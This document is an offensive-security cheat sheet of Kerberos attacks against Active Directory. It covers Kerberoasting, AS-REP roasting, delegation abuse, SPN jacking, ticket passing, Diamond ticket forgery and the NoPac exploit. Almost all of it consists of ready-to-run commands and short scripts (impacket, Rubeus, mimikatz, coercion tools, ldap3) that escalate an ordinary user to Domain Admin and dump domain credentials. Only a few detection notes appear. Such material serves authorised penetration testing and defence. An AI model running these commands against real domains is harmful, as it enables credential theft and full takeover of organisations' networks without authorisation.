# Kerberos Attacks — Roasting, Delegation, Ticket Forgery

---

## Kerberoasting

Request TGS for any SPN-set user → crack RC4 ticket offline. No special privilege needed.

```bash
# impacket (Linux)
impacket-GetUserSPNs domain.local/user:pass -dc-ip <dc_ip> -request -outputfile kerberoast.txt
impacket-GetUserSPNs domain.local/user -hashes :NTLM -dc-ip <dc_ip> -request  # pass-the-hash

# Rubeus (Windows)
.\Rubeus.exe kerberoast /outfile:kerberoast.txt /format:hashcat
.\Rubeus.exe kerberoast /user:<specific_user> /format:hashcat  # targeted

# Crack (hashcat mode 13100 = RC4; mode 19700 = AES256)
hashcat -m 13100 kerberoast.txt rockyou.txt -r rules/best64.rule
hashcat -m 19700 kerberoast.txt rockyou.txt   # if AES256 enforced

# High-value targets: look for admincount=1 SPN accounts
Get-DomainUser -SPN | Where admincount -eq 1 | Select samaccountname, serviceprincipalname
```

**RC4 vs AES256**: RC4 (etype 23) cracks faster; AES256 (etype 18) much slower. If target enforces AES, crack time increases significantly. Check: `Get-DomainUser -SPN -Properties msDS-SupportedEncryptionTypes`.

---

## AS-REP Roasting

Users with `DONT_REQ_PREAUTH` flag set expose encrypted TGT without authentication.

```bash
# impacket — no creds needed if user list known
impacket-GetNPUsers domain.local/ -usersfile users.txt -dc-ip <dc_ip> -format hashcat -outputfile asrep.txt

# impacket — with creds (auto-enumerate from LDAP)
impacket-GetNPUsers domain.local/user:pass -dc-ip <dc_ip> -request -format hashcat

# Rubeus (Windows)
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Crack (hashcat mode 18200)
hashcat -m 18200 asrep.txt rockyou.txt
```

---

## Unconstrained Delegation abuse

Computer/service configured with unconstrained delegation stores incoming TGTs in memory. If you control that machine, extract any TGT that authenticated to it — including DC machine account (→ DCSync).

```bash
# Find unconstrained delegation computers
Get-DomainComputer -Unconstrained | Select dnshostname

# If you have code execution on unconstrained machine:
# Coerce DC authentication → DC TGT lands in memory on compromised host
python3 Coercer.py coerce -u user -p pass -d domain.local -t <dc_ip> -l <unconstrained_host>

# Extract TGT from memory (Rubeus on compromised host)
.\Rubeus.exe triage          # list tickets
.\Rubeus.exe dump /luid:<LUID> /nowrap    # dump DC ticket

# Import and use
.\Rubeus.exe ptt /ticket:<base64>
# OR on Linux:
echo "<base64>" | base64 -d > dc.ccache
export KRB5CCNAME=dc.ccache
impacket-secretsdump -k -no-pass domain.local/dc$@<dc_ip>  # DCSync
```

---

## Constrained Delegation abuse

Service configured for constrained delegation can request S4U2Proxy TGS on behalf of any user for specific target services — even Domain Admin.

```bash
# Find constrained delegation accounts
Get-DomainUser -TrustedToAuth | Select samaccountname, msDS-AllowedToDelegateTo
Get-DomainComputer -TrustedToAuth | Select dnshostname, msDS-AllowedToDelegateTo

# If you have control of delegated service account:
# impacket — S4U2Self + S4U2Proxy
impacket-getST -spn <allowed_spn> domain.local/svc_account:pass -impersonate administrator -dc-ip <dc_ip>
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass domain.local/administrator@<target>

# With -altservice: rewrite service class in the ticket (ticket is encrypted with target key)
# Useful when AllowedToDelegateTo = HTTP/host but you need CIFS/host for file access
impacket-getST -spn HTTP/<target_fqdn> -impersonate administrator -altservice CIFS/<target_fqdn> \
  domain.local/svc_account:pass -dc-ip <dc_ip>
# The TGS is encrypted with the target host's key — changing service class doesn't break it
# because service class is in the unencrypted portion of the ticket

# Rubeus S4U (Windows)
.\Rubeus.exe s4u /user:svc_account /password:pass /impersonateuser:administrator /msdsspn:<allowed_spn> /ptt
# With altservice:
.\Rubeus.exe s4u /user:svc_account /password:pass /impersonateuser:administrator \
  /msdsspn:HTTP/<target> /altservice:cifs/<target> /ptt
```

**Clock skew**: Kerberos operations fail with `KRB_AP_ERR_SKEW` if client clock differs >5 min from DC. See `[references/kerberos-time-skew.md](kerberos-time-skew.md)` for `libfaketime` bypass workflows and active syncing.

---

## SPN Jacking (SPN Hijacking via WriteSPN)

When an account has Constrained Delegation to a specific SPN (e.g., `HTTP/WEB01.domain.local`) and you control a principal with **WriteSPN** (Validated Write to servicePrincipalName) on both the current SPN holder and a higher-value target:

**Concept**: Move the target SPN from machine A to machine B. The KDC resolves SPNs at request time — if `HTTP/WEB01.domain.local` is now on DC01$, S4U2Proxy encrypts the TGS with DC01$'s key. Use `-altservice` to rewrite to `CIFS/DC01.domain.local`.

```bash
# Prerequisites:
# - Controlled account (svc_kcd) with msDS-AllowedToDelegateTo = ['HTTP/TARGET.domain.local']
# - WriteSPN permission on both SOURCE$ (current SPN holder) and DEST$ (desired target)

# Step 1: Remove SPN from current holder
python3 -c "
import ldap3
from ldap3 import Server, Connection, MODIFY_ADD, MODIFY_DELETE, NTLM
conn = Connection(Server('<dc_ip>'), user='domain\\\\attacker', password='pass', authentication=NTLM)
conn.bind()
conn.modify('CN=SOURCE,CN=Computers,DC=domain,DC=local',
    {'servicePrincipalName': [(MODIFY_DELETE, ['HTTP/TARGET.domain.local'])]})
print(conn.result['description'])
"

# Step 2: Add SPN to desired target (e.g., DC)
python3 -c "
import ldap3
from ldap3 import Server, Connection, MODIFY_ADD, MODIFY_DELETE, NTLM
conn = Connection(Server('<dc_ip>'), user='domain\\\\attacker', password='pass', authentication=NTLM)
conn.bind()
conn.modify('CN=DC01,OU=Domain Controllers,DC=domain,DC=local',
    {'servicePrincipalName': [(MODIFY_ADD, ['HTTP/TARGET.domain.local'])]})
print(conn.result['description'])
"

# Step 3: S4U2Proxy — KDC now resolves SPN to DC01$ → ticket encrypted with DC01$ key
impacket-getST -spn HTTP/TARGET.domain.local -impersonate administrator \
  -altservice CIFS/DC01.domain.local domain.local/svc_kcd:pass -dc-ip <dc_ip>
export KRB5CCNAME=administrator@CIFS_DC01.domain.local@DOMAIN.LOCAL.ccache
impacket-wmiexec -k -no-pass administrator@DC01.domain.local

# Alternative: bloodyAD for SPN manipulation
bloodyAD -u attacker -p pass -d domain.local --host <dc_ip> set object 'SOURCE$' servicePrincipalName -v 'HTTP/TARGET.domain.local' --remove
bloodyAD -u attacker -p pass -d domain.local --host <dc_ip> set object 'DC01$' servicePrincipalName -v 'HTTP/TARGET.domain.local' --append
```

**Key details**:
- AD enforces SPN uniqueness — must REMOVE from source before ADD to destination (otherwise `constraintViolation`)
- WriteSPN = Validated Write to `servicePrincipalName` attribute (commonly granted to groups managing computer objects)
- The KCD account's `msDS-AllowedToDelegateTo` doesn't change — only the SPN-to-account mapping moves
- `-altservice` works because the ticket's service class (`sname` field) is in the unencrypted ticket portion; the encrypted part uses the target account's key regardless of service class
- Protocol Transition (`TrustedToAuthForDelegation`) on the KCD account enables S4U2Self without a forwardable TGT from the impersonated user

**Detection**: Event ID 4742 (computer account modified) with `servicePrincipalName` attribute change on a Domain Controller object.

---

## Resource-Based Constrained Delegation (RBCD)

If you have `GenericWrite`/`GenericAll` on a computer object → add controlled computer account to `msDS-AllowedToActOnBehalfOfOtherIdentity` → impersonate any user to that computer.

```bash
# Step 1: Create new machine account (or use existing controlled account)
impacket-addcomputer domain.local/user:pass -computer-name EVIL$ -computer-pass 'Evil123!'

# Step 2: Set RBCD attribute (PowerView or impacket)
# PowerView:
$SID = Get-DomainComputer EVIL$ | Select -ExpandProperty objectsid
Set-DomainObject -Identity <target_computer> -Set @{'msds-allowedtoactonbehalfofotheridentity'=...}

# Step 3: Get S4U TGS impersonating DA
impacket-getST -spn cifs/<target> domain.local/EVIL$:'Evil123!' -impersonate administrator
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass domain.local/administrator@<target>
```

---

## Pass-the-Ticket

```bash
# Import .kirbi ticket (from Rubeus dump)
impacket-ticketConverter ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass domain.local/user@<target>

# Import directly via Rubeus (Windows in-memory)
.\Rubeus.exe ptt /ticket:<base64>
.\Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show   # spawn process with ticket

# List current tickets
.\Rubeus.exe triage
klist   # Windows built-in
```

---

## Overpass-the-Hash (Pass-the-Key)

Convert NTLM hash → Kerberos TGT. Useful when NTLM is blocked but Kerberos is allowed.

```bash
# impacket
impacket-getTGT domain.local/user -hashes :NTLM -dc-ip <dc_ip>
export KRB5CCNAME=user.ccache
impacket-psexec -k -no-pass domain.local/user@<target>

# Rubeus (Windows)
.\Rubeus.exe asktgt /user:user /rc4:<NTLM> /ptt
.\Rubeus.exe asktgt /user:user /aes256:<AES256_KEY> /ptt  # preferred (less noisy)
```

---

## Diamond Ticket

Modifies a legitimate TGT instead of forging one from scratch. More stealthy than Golden Ticket because the ticket has a real creation timestamp, valid PA-DATA, and matches Kerberos policy values.

**Requirements**: `krbtgt` AES256 key + any valid domain credential.

```bash
# Basic Diamond Ticket — request legitimate TGT, decrypt, modify PAC, re-encrypt
.\Rubeus.exe diamond /krbkey:<aes256_krbtgt> /user:<low_priv_user> /password:<pass> /enctype:aes \
  /domain:domain.local /dc:<dc_fqdn> /ticketuser:Administrator /ticketuserid:500 /nowrap

# With /tgtdeleg — avoid sending credentials, uses Kerberos delegation to get TGT
.\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 \
  /krbkey:<aes256_krbtgt> /nowrap

# OPSEC-enhanced (2024+) — /ldap pulls real PAC data, /opsec matches Windows AS-REQ flow
.\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 \
  /krbkey:<aes256_krbtgt> /ldap /opsec /nowrap

# Diamond Ticket with ExtraSID (child-to-parent trust escalation)
.\Rubeus.exe diamond /tgtdeleg /ticketuser:administrator /ticketuserid:500 /groups:512 \
  /sids:<parent_EA_SID>-519 /krbkey:<child_krbtgt_aes256> /nowrap

# Service-ticket recutting (stealthier Silver Ticket)
.\Rubeus.exe diamond /ticket:<base64_tgt> /service:cifs/<target_host> \
  /servicekey:<aes256_service_key> /ticketuser:Administrator /ticketuserid:500 \
  /ldap /opsec /nowrap
```

**Golden vs Diamond**:
| Aspect | Golden Ticket | Diamond Ticket |
|--------|--------------|----------------|
| TGT origin | Forged from scratch | Modified legitimate TGT |
| Timestamp | Arbitrary (detectable) | Real DC-issued timestamp |
| PA-DATA | Missing/fake | Real pre-auth data |
| Policy values | Must guess | Pulled from SYSVOL/LDAP |
| Detection | Easier (anomalous lifetime, missing fields) | Harder (looks legitimate) |
| Requirement | krbtgt NTLM/AES | krbtgt AES + valid user creds |

---

## NoPac / sAMAccountName Spoofing (CVE-2021-42278 + CVE-2021-42287)

Escalates from any domain user to Domain Admin by exploiting how KDC resolves machine account names.

**Mechanism**:
1. Create a machine account (default: any user can create up to 10)
2. Rename machine account's sAMAccountName to match DC name (without trailing `$`)
3. Request TGT for the spoofed name
4. Rename machine account back to original
5. Request TGS using the TGT — KDC can't find the account, appends `$`, finds DC account → grants DC-level access

```bash
# Automated exploitation (noPac.py)
python3 noPac.py domain.local/user:pass -dc-ip <dc_ip> -dc-host <dc_hostname> --impersonate administrator -dump
python3 noPac.py domain.local/user:pass -dc-ip <dc_ip> -dc-host <dc_hostname> --impersonate administrator -shell

# Manual steps (impacket)
# 1. Create machine account
impacket-addcomputer domain.local/user:pass -computer-name 'ATTACKER$' -computer-pass 'Passw0rd!'

# 2. Clear SPNs and rename to DC
python3 renameMachine.py domain.local/user:pass -current-name 'ATTACKER$' -new-name '<dc_hostname>'

# 3. Request TGT for spoofed name
impacket-getTGT domain.local/'<dc_hostname>':'Passw0rd!' -dc-ip <dc_ip>

# 4. Rename back
python3 renameMachine.py domain.local/user:pass -current-name '<dc_hostname>' -new-name 'ATTACKER$'

# 5. Use S4U2self to get service ticket as administrator
export KRB5CCNAME='<dc_hostname>.ccache'
impacket-getST -spn 'cifs/<dc_fqdn>' -impersonate administrator domain.local/'<dc_hostname>' -k -no-pass
export KRB5CCNAME=administrator.ccache
impacket-secretsdump -k -no-pass domain.local/administrator@<dc_fqdn>

# Check if patched (MachineAccountQuota > 0 required)
crackmapexec ldap <dc_ip> -u user -p pass -M maq
```

**Detection**: Event ID 4741 (computer account created) + 4742 (account modified) in quick succession.

---

## Kerberos Double-Hop Problem — Workarounds

When using WinRM/PSRemoting, Kerberos tickets are not forwarded to the second hop (e.g., querying LDAP from a remote session). Workarounds:

```powershell
# Workaround 1: PSCredential object (explicit credentials)
$cred = New-Object PSCredential('DOMAIN\user', (ConvertTo-SecureString 'pass' -AsPlainText -Force))
Get-DomainUser -SPN -Credential $cred

# Workaround 2: Register PSSession configuration with RunAs
Register-PSSessionConfiguration -Name 'AdminSession' -RunAsCredential DOMAIN\user
Restart-Service WinRM
Enter-PSSession -ComputerName <host> -Credential DOMAIN\user -ConfigurationName AdminSession
# Now klist shows valid TGT — second hop works

# Workaround 3: CredSSP delegation (less common, requires GPO)
Enable-WSManCredSSP -Role Client -DelegateComputer <target>
Enter-PSSession -ComputerName <target> -Authentication CredSSP -Credential $cred
```

---

## Golden and Silver Ticket

See `active-directory-technique` SKILL.md §Phase 6.

Key material:
- **Golden**: `krbtgt` NTLM hash + domain SID → forge any TGT
- **Silver**: service account NTLM hash + domain SID → forge TGS for that service

Golden ticket persists even after password reset (krbtgt needs two resets to invalidate).

---

## Unconstrained Delegation — Coercion-Based Exploitation

Detailed coercion workflow for unconstrained delegation abuse:

```bash
# 1. Identify unconstrained delegation hosts (excluding DCs)
Get-DomainComputer -Unconstrained | Where-Object {$_.distinguishedname -notmatch "Domain Controllers"} | Select dnshostname

# 2. Set up Rubeus monitor on compromised unconstrained host
.\Rubeus.exe monitor /interval:5 /nowrap /targetuser:<dc_hostname>$

# 3. Coerce DC to authenticate to the unconstrained host
python3 Coercer.py coerce -u user -p pass -d domain.local -t <dc_ip> -l <unconstrained_host_ip>
# OR: python3 SpoolSample.py <dc_fqdn> <unconstrained_host_fqdn>
# OR: python3 PetitPotam.py <unconstrained_host_ip> <dc_ip>

# 4. Rubeus captures DC TGT — export and use for DCSync
.\Rubeus.exe ptt /ticket:<captured_dc_tgt_base64>
.\mimikatz.exe "lsadump::dcsync /domain:domain.local /all" "exit"

# Alternative: extract on Linux
echo "<base64_ticket>" | base64 -d > dc_tgt.kirbi
impacket-ticketConverter dc_tgt.kirbi dc_tgt.ccache
export KRB5CCNAME=dc_tgt.ccache
impacket-secretsdump -k -no-pass domain.local/<dc_hostname>$@<dc_fqdn>
```
